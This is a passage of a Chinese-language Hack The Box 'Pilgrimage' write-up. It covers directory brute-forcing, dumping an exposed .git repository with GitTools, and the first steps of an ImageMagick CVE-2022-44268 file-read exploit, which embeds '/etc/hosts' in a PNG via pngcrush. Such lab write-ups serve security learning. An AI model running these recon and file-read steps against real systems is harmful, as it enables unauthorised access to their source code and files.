class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(pytool)─(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ sudo dirsearch -u http://pilgrimage.htb<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/pilgrimage.htb/_23-07-08_01-54-25.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-08_01-54-25.<span class="hljs-built_in">log</span><br><br>Target: http://pilgrimage.htb/<br><br>[01:54:25] Starting:<br>[01:54:26] 403 -  555B  - /.git/<br>[01:54:26] 403 -  555B  - /.git/branches/<br>[01:54:26] 200 -   92B  - /.git/config<br>[01:54:26] 200 -   23B  - /.git/HEAD<br>[01:54:26] 200 -   73B  - /.git/description<br>[01:54:26] 200 -    2KB - /.git/COMMIT_EDITMSG<br>[01:54:26] 403 -  555B  - /.git/hooks/<br>[01:54:26] 301 -  169B  - /.git  -&gt;  http://pilgrimage.htb/.git/<br>[01:54:26] 200 -  240B  - /.git/info/exclude<br>[01:54:26] 403 -  555B  - /.git/logs/<br>[01:54:26] 403 -  555B  - /.git/info/<br>[01:54:26] 200 -  195B  - /.git/logs/HEAD<br>[01:54:26] 403 -  555B  - /.git/refs/<br>[01:54:26] 301 -  169B  - /.git/logs/refs  -&gt;  http://pilgrimage.htb/.git/logs/refs/<br>[01:54:26] 301 -  169B  - /.git/logs/refs/heads  -&gt;  http://pilgrimage.htb/.git/logs/refs/heads/<br>[01:54:26] 301 -  169B  - /.git/refs/heads  -&gt;  http://pilgrimage.htb/.git/refs/heads/<br>[01:54:26] 200 -  195B  - /.git/logs/refs/heads/master<br>[01:54:26] 403 -  555B  - /.git/objects/<br>[01:54:26] 200 -   41B  - /.git/refs/heads/master<br>[01:54:26] 301 -  169B  - /.git/refs/tags  -&gt;  http://pilgrimage.htb/.git/refs/tags/<br>[01:54:26] 200 -    4KB - /.git/index<br>[01:54:26] 403 -  555B  - /.ht_wsr.txt<br>[01:54:26] 403 -  555B  - /.htaccess.bak1<br>[01:54:26] 403 -  555B  - /.htaccess.orig<br>[01:54:26] 403 -  555B  - /.htaccess.save<br>[01:54:26] 403 -  555B  - /.htaccess_extra<br>[01:54:26] 403 -  555B  - /.htaccess.sample<br>[01:54:26] 403 -  555B  - /.htaccess_orig<br>[01:54:26] 403 -  555B  - /.htaccessOLD<br>[01:54:26] 403 -  555B  - /.htaccessBAK<br>[01:54:26] 403 -  555B  - /.htaccess_sc<br>[01:54:26] 403 -  555B  - /.htpasswd_test<br>[01:54:26] 403 -  555B  - /.htm<br>[01:54:26] 403 -  555B  - /.htaccessOLD2<br>[01:54:26] 403 -  555B  - /.html<br>[01:54:26] 403 -  555B  - /.htpasswds<br>[01:54:26] 403 -  555B  - /.httr-oauth<br>[01:54:33] 403 -  555B  - /admin/.htaccess<br>[01:54:36] 403 -  555B  - /administrator/.htaccess<br>[01:54:37] 403 -  555B  - /app/.htaccess<br>[01:54:37] 301 -  169B  - /assets  -&gt;  http://pilgrimage.htb/assets/<br>[01:54:37] 403 -  555B  - /assets/<br>[01:54:42] 302 -    0B  - /dashboard.php  -&gt;  /login.php<br>[01:54:48] 200 -    7KB - /index.php<br>[01:54:50] 200 -    6KB - /login.php<br>[01:54:50] 302 -    0B  - /logout.php  -&gt;  /<br>[01:54:58] 200 -    6KB - /register.php<br>[01:55:04] 301 -  169B  - /tmp  -&gt;  http://pilgrimage.htb/tmp/<br>[01:55:04] 403 -  555B  - /tmp/<br>[01:55:06] 403 -  555B  - /vendor/<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>目录的爆破的结果中最值得关注的只有 <code>.git</code>，搜索 <code>&quot;.git&quot; expose</code></p><p><img src="/pic/976bd7873c8ba0a2c2d626d335336816_MD5.png"></p><p>第二个链接中 <a href="https://infosecwriteups.com/exposed-git-directory-exploitation-3e30481e8d75">Exposed .git Directory Exploitation | by Yani | InfoSec Write-ups (infosecwriteups.com)</a>，提到了一个工具 <code>GitTools</code>，将其下载到本地，然后根据说明来进行操作：<a href="https://github.com/internetwache/GitTools">internetwache&#x2F;GitTools: A repository with 3 tools for pwn’ing websites with .git repositories available (github.com)</a></p><p><img src="/pic/53a1a4d00b3d317aaced18b50d96cb30_MD5.png"></p><blockquote><p>Dumper: This tool can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper]<br>└─$ ./gitdumper.sh http://pilgrimage.htb/.git/ <span class="hljs-built_in">clone</span><br><span class="hljs-comment">###########</span><br><span class="hljs-comment"># GitDumper is part of https://github.com/internetwache/GitTools</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Developed and maintained by @gehaxelt from @internetwache</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Use at your own risk. Usage might be illegal in certain circumstances.</span><br><span class="hljs-comment"># Only for educational purposes!</span><br><span class="hljs-comment">###########</span><br><br><br>[*] Destination folder does not exist<br>[+] Creating <span class="hljs-built_in">clone</span>/.git/<br>[+] Downloaded: HEAD<br>[-] Downloaded: objects/info/packs<br>[+] Downloaded: description<br>[+] Downloaded: config<br>[+] Downloaded: COMMIT_EDITMSG<br>[+] Downloaded: index<br>[-] Downloaded: packed-refs<br>[+] Downloaded: refs/heads/master<br>[-] Downloaded: refs/remotes/origin/HEAD<br>[-] Downloaded: refs/stash<br>[+] Downloaded: logs/HEAD<br>[+] Downloaded: logs/refs/heads/master<br>[-] Downloaded: logs/refs/remotes/origin/HEAD<br>[-] Downloaded: info/refs<br>[+] Downloaded: info/exclude<br>[-] Downloaded: /refs/wip/index/refs/heads/master<br>[-] Downloaded: /refs/wip/wtree/refs/heads/master<br>[+] Downloaded: objects/e1/a40beebc7035212efdcb15476f9c994e3634a7<br>[-] Downloaded: objects/00/00000000000000000000000000000000000000<br>[+] Downloaded: objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212<br>[+] Downloaded: objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d<br>[+] Downloaded: objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc<br>[+] Downloaded: objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d<br>[+] Downloaded: objects/dc/446514835fe49994e27a1c2cf35c9e45916c71<br>[+] Downloaded: objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e<br>[+] Downloaded: objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548<br>[+] Downloaded: objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb<br>[+] Downloaded: objects/36/c734d44fe952682020fd9762ee9329af51848d<br>[+] Downloaded: objects/b2/15e14bb4766deff4fb926e1aa080834935d348<br>[+] Downloaded: objects/8f/155a75593279c9723a1b15e5624a304a174af2<br>[+] Downloaded: objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e<br>[+] Downloaded: objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e<br>[+] Downloaded: objects/98/10e80fba2c826a142e241d0f65a07ee580eaad<br>[+] Downloaded: objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd<br>[+] Downloaded: objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc<br>[+] Downloaded: objects/76/a559577d4f759fff6af1249b4a277f352822d5<br>[+] Downloaded: objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c<br>[+] Downloaded: objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e<br>[+] Downloaded: objects/8a/62aac3b8e9105766f3873443758b7ddf18d838<br>[+] Downloaded: objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783<br>[+] Downloaded: objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2<br>[+] Downloaded: objects/88/16d69710c5d2ee58db84afa5691495878f4ee1<br>[+] Downloaded: objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a<br>[+] Downloaded: objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23<br>[+] Downloaded: objects/b6/c438e8ba16336198c2e62fee337e126257b909<br>[+] Downloaded: objects/11/dbdd149e3a657bc59750b35e1136af861a579f<br>[+] Downloaded: objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568<br>[+] Downloaded: objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18<br>[+] Downloaded: objects/5f/ec5e0946296a0f09badeb08571519918c3da77<br>[+] Downloaded: objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987<br>[+] Downloaded: objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a<br>[+] Downloaded: objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322<br>[+] Downloaded: objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1<br>[+] Downloaded: objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34<br>[+] Downloaded: objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7<br>[+] Downloaded: objects/49/cd436cf92cc28645e5a8be4b1973683c95c537<br>[+] Downloaded: objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3<br>[+] Downloaded: objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc<br>[+] Downloaded: objects/ca/d9dfca08306027b234ddc2166c838de9301487<br>[+] Downloaded: objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4<br>[+] Downloaded: objects/c4/3565452792f19d2cf2340266dbecb82f2a0571<br>[+] Downloaded: objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59<br>[+] Downloaded: objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4<br>[+] Downloaded: objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14<br>[+] Downloaded: objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b<br>[-] Downloaded: objects/23/12310101010101010101410301010101210101<br>[-] Downloaded: objects/23/03032323230123232323212123212303632303<br>[-] Downloaded: objects/23/21236303230321632123036767012147470701<br>[-] Downloaded: objects/47/07412547250503474341056701016565070147<br>[-] Downloaded: objects/41/61416543747052570741470565674701054165<br>[-] Downloaded: objects/65/43450543454147054147414565014170505650<br>[-] Downloaded: objects/54/74547454747476767476767676767236323632<br>[-] Downloaded: objects/36/76745054545454545456545454545454545454<br>[-] Downloaded: objects/76/76701676767670105676767672167676767010<br>[+] Downloaded: objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb<br>[+] Downloaded: objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e<br></code></pre></td></tr></table></figure><p><code>http://pilgrimage.htb/.git/</code> 是目标目录，并且需要把最后一个 <code>/</code> 也给到参数，第二个参数是输出的目录，这里按照示例中那样命名为 <code>clone</code>，下载成功后进入 clone 目录，查看 git 的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># git log 查看本地日志</span><br>┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ git <span class="hljs-built_in">log</span><br>commit e1a40beebc7035212efdcb15476f9c994e3634a7 (HEAD -&gt; master)<br>Author: emily &lt;emily@pilgrimage.htb&gt;<br>Date:   Wed Jun 7 20:11:48 2023 +1000<br><br>    Pilgrimage image shrinking service initial commit.<br><br><span class="hljs-comment"># git status 查看最近的更改</span><br>┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ git status<br>On branch master<br>Changes not staged <span class="hljs-keyword">for</span> commit:<br>  (use <span class="hljs-string">&quot;git add/rm &lt;file&gt;...&quot;</span> to update what will be committed)<br>  (use <span class="hljs-string">&quot;git restore &lt;file&gt;...&quot;</span> to discard changes <span class="hljs-keyword">in</span> working directory)<br>        deleted:    assets/bulletproof.php<br>        deleted:    assets/css/animate.css<br>        deleted:    assets/css/custom.css<br>        deleted:    assets/css/flex-slider.css<br>        deleted:    assets/css/fontawesome.css<br>        deleted:    assets/css/owl.css<br>        deleted:    assets/css/templatemo-woox-travel.css<br>        deleted:    assets/images/banner-04.jpg<br>        deleted:    assets/images/cta-bg.jpg<br>        deleted:    assets/js/custom.js<br>        deleted:    assets/js/isotope.js<br>        deleted:    assets/js/isotope.min.js<br>        deleted:    assets/js/owl-carousel.js<br>        deleted:    assets/js/popup.js<br>        deleted:    assets/js/tabs.js<br>        deleted:    assets/webfonts/fa-brands-400.ttf<br>        deleted:    assets/webfonts/fa-brands-400.woff2<br>        deleted:    assets/webfonts/fa-regular-400.ttf<br>        deleted:    assets/webfonts/fa-regular-400.woff2<br>        deleted:    assets/webfonts/fa-solid-900.ttf<br>        deleted:    assets/webfonts/fa-solid-900.woff2<br>        deleted:    assets/webfonts/fa-v4compatibility.ttf<br>        deleted:    assets/webfonts/fa-v4compatibility.woff2<br>        deleted:    dashboard.php<br>        deleted:    index.php<br>        deleted:    login.php<br>        deleted:    logout.php<br>        deleted:    magick<br>        deleted:    register.php<br>        deleted:    vendor/bootstrap/css/bootstrap.min.css<br>        deleted:    vendor/bootstrap/js/bootstrap.min.js<br>        deleted:    vendor/jquery/jquery.js<br>        deleted:    vendor/jquery/jquery.min.js<br>        deleted:    vendor/jquery/jquery.min.map<br>        deleted:    vendor/jquery/jquery.slim.js<br>        deleted:    vendor/jquery/jquery.slim.min.js<br>        deleted:    vendor/jquery/jquery.slim.min.map<br><br>no changes added to commit (use <span class="hljs-string">&quot;git add&quot;</span> and/or <span class="hljs-string">&quot;git commit -a&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>通过查看日志和状态，我们看到有些文件被删除了，接下来可以使用命令来恢复</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ git checkout -- .<br><br>┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 27M<br>982572 drwxr-xr-x 5 i3eg1nner i3eg1nner 4.0K Jul  8 03:58 .<br>982207 drwxr-xr-x 3 i3eg1nner i3eg1nner 4.0K Jul  8 03:44 ..<br>982703 drwxr-xr-x 6 i3eg1nner i3eg1nner 4.0K Jul  8 03:58 assets<br>982731 -rwxr-xr-x 1 i3eg1nner i3eg1nner 5.5K Jul  8 03:58 dashboard.php<br>982573 drwxr-xr-x 6 i3eg1nner i3eg1nner 4.0K Jul  8 03:58 .git<br>982732 -rwxr-xr-x 1 i3eg1nner i3eg1nner 9.1K Jul  8 03:58 index.php<br>982733 -rwxr-xr-x 1 i3eg1nner i3eg1nner 6.7K Jul  8 03:58 login.php<br>982734 -rwxr-xr-x 1 i3eg1nner i3eg1nner   98 Jul  8 03:58 logout.php<br>982735 -rwxr-xr-x 1 i3eg1nner i3eg1nner  27M Jul  8 03:58 magick<br>982736 -rwxr-xr-x 1 i3eg1nner i3eg1nner 6.7K Jul  8 03:58 register.php<br>982737 drwxr-xr-x 4 i3eg1nner i3eg1nner 4.0K Jul  8 03:58 vendor<br></code></pre></td></tr></table></figure><p>恢复后，我们简单查看各个文件和目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ tree<br>.<br>├── assets<br>│   ├── bulletproof.php<br>│   ├── css<br>│   │   ├── animate.css<br>│   │   ├── custom.css<br>│   │   ├── flex-slider.css<br>│   │   ├── fontawesome.css<br>│   │   ├── owl.css<br>│   │   └── templatemo-woox-travel.css<br>│   ├── images<br>│   │   ├── banner-04.jpg<br>│   │   └── cta-bg.jpg<br>│   ├── js<br>│   │   ├── custom.js<br>│   │   ├── isotope.js<br>│   │   ├── isotope.min.js<br>│   │   ├── owl-carousel.js<br>│   │   ├── popup.js<br>│   │   └── tabs.js<br>│   └── webfonts<br>│       ├── fa-brands-400.ttf<br>│       ├── fa-brands-400.woff2<br>│       ├── fa-regular-400.ttf<br>│       ├── fa-regular-400.woff2<br>│       ├── fa-solid-900.ttf<br>│       ├── fa-solid-900.woff2<br>│       ├── fa-v4compatibility.ttf<br>│       └── fa-v4compatibility.woff2<br>├── dashboard.php<br>├── index.php<br>├── login.php<br>├── logout.php<br>├── magick<br>├── register.php<br>└── vendor<br>    ├── bootstrap<br>    │   ├── css<br>    │   │   └── bootstrap.min.css<br>    │   └── js<br>    │       └── bootstrap.min.js<br>    └── jquery<br>        ├── jquery.js<br>        ├── jquery.min.js<br>        ├── jquery.min.map<br>        ├── jquery.slim.js<br>        ├── jquery.slim.min.js<br>        └── jquery.slim.min.map<br><br>11 directories, 37 files<br></code></pre></td></tr></table></figure><p>发现连接的数据库和一个特殊的可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br>  <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>  <span class="hljs-variable">$db</span> = new PDO(<span class="hljs-string">&#x27;sqlite:/var/db/pilgrimage&#x27;</span>);<br>  <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;prepare(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? and password = ?&quot;</span>);<br>  <span class="hljs-variable">$stmt</span>-&gt;execute(array(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>));<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$stmt</span>-&gt;fetchAll()) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>    header(<span class="hljs-string">&quot;Location: /dashboard.php&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    header(<span class="hljs-string">&quot;Location: /login.php?message=Login failed&amp;status=fail&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>顺便测试了一下 sql 注入，使用了 sqlmap，不过没成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://pilgrimage.htb/login.php --forms<br></code></pre></td></tr></table></figure><p>之前对于 POST 注入，更多的是使用 burp 抓包然后保存为本地文件，再使用 sqlmap 操作，推荐这篇教程看看另外两种方法：<a href="https://www.wangan.com/docs/1090">4.1 SqlMap之POST登陆框注入实战_「SqlMap中文版使用教程」 - 网安 (wangan.com)</a></p><h2 id="Imagemagick-任意文件读取漏洞"><a href="#Imagemagick-任意文件读取漏洞" class="headerlink" title="Imagemagick 任意文件读取漏洞"></a>Imagemagick 任意文件读取漏洞</h2><p>那接下来就只有个可疑的可执行文件了，由于这个文件太大，尝试读取后没什么收获，我选择了直接执行试试，不过这里建议对于这些文件不要在本机中直接执行，防止有安全问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ ./magick<br>Error: Invalid argument or not enough arguments<br><br>Usage: magick tool [ &#123;option&#125; | &#123;image&#125; ... ] &#123;output_image&#125;<br>Usage: magick [ &#123;option&#125; | &#123;image&#125; ... ] &#123;output_image&#125;<br>       magick [ &#123;option&#125; | &#123;image&#125; ... ] -script &#123;filename&#125; [ &#123;script_args&#125; ...]<br>       magick -<span class="hljs-built_in">help</span> | -version | -usage | -list &#123;option&#125;<br></code></pre></td></tr></table></figure><p>报错给了一些使用方法的教程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ ./magick -version<br>Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org<br>Copyright: (C) 1999 ImageMagick Studio LLC<br>License: https://imagemagick.org/script/license.php<br>Features: Cipher DPC HDRI OpenMP(4.5)<br>Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib<br>Compiler: gcc (7.5)<br></code></pre></td></tr></table></figure><p>看了一眼 version，然后去谷歌这个工具到底是在干嘛</p><p><img src="/pic/d57ee20929a5218d558c0e911d74f426_MD5.png"></p><p>一个开源的图片处理工具，结合我们对首页的观察，大概可以判断出网站是在使用这个工具对用户上传的图片进行处理，此外这个工具的最新版是 7.1.1，但是 .git 泄露的文件中其版本号为 <code>7.1.0-49</code>，或许存在漏洞，尝试谷歌一下</p><p><img src="/pic/91bf403cbc94bf2716afe3d3a3413fcd_MD5.png"></p><p>存在任意文件读取漏洞，根据 CVE 来找 PoC：</p><p><a href="https://github.com/voidz0r/CVE-2022-44268">voidz0r&#x2F;CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read (github.com)</a></p><p>这个脚本运行会提示 cargo 不存在，我不确定是否是需要我本机安装，找了个别的 PoC： </p><p><a href="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC">duc-nt&#x2F;CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC: CVE-2022-44268 ImageMagick Arbitrary File Read - Payload Generator (github.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装依赖</span><br>apt-get install pngcrush imagemagick exiftool exiv2 -y<br><br><span class="hljs-comment"># 本机找一个png文件命名为vjp.png，将自己想查看的文件名放入参数中，工具会将其写入图片里</span><br>┌──(i3eg1nner㉿minilite)-[~/Downloads/Pilgrimage]<br>└─$ pngcrush -text a <span class="hljs-string">&quot;profile&quot;</span> <span class="hljs-string">&quot;/etc/hosts&quot;</span> vjp.png<br>  Recompressing IDAT chunks <span class="hljs-keyword">in</span> vjp.png to pngout.png<br>   Total length of data found <span class="hljs-keyword">in</span> critical chunks            =     32339<br>   Best pngcrush method        =   6 (ws 15 fm 6 zl 9 zs 0) =     32134<br>CPU time decode 0.017508, encode 0.292588, other 0.002413, total 0.314946 sec<br><br><span class="hljs-comment"># 看到信息是否被写入其中</span><br>┌──(i3eg1nner㉿minilite)-[~/Downloads/Pilgrimage]<br>└─$ exiv2 -pS pngout.png<br>STRUCTURE OF PNG FILE: pngout.png<br> address | chunk |  length | data                           | checksum<br>       8 | IHDR  |      13 | ............                   | 0xf7f684ff<br>      33 | pHYs  |       9 | .........                      | 0x952b0e1b<br>      54 | IDAT  |   32077 | x......E....9...&amp;..!.9D....Q.V | 0x26fba351<br>   32143 | tEXt 